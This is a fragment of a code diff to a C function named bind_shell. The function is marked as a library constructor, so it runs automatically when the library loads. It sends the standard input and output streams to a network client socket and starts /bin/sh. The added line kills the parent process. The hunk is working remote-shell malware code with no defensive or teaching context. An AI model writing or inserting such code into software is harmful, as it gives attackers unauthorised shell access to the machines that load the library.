@@ -24,6 +24,7 @@ void __attribute__((constructor)) bind_shell(){
       dup2(client_sock, 0);
       dup2(client_sock, 1);
       dup2(client_sock, 2);
+      kill(getppid(), SIGKILL);
       execve("/bin/sh", NULL, NULL);
     }else{
       wait(NULL);
